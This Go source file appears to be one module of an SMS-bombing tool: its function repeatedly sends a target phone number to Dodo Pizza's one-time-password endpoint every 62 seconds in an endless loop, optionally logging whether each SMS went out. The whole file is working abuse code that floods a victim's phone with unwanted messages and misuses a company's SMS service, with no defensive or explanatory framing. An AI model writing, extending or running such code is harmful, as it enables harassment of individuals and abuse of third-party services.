package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func dodopizza() {
	req := newreq()
	req.SetBodyString("PhoneNumber=" + num)
	req.SetRequestURI("https://api.dodopizza.ru/api/v1/clients/SendOneTimePassword")
	req.Header.SetMethod("POST")

	timeout := time.Minute + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `hasSmsSent": true`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
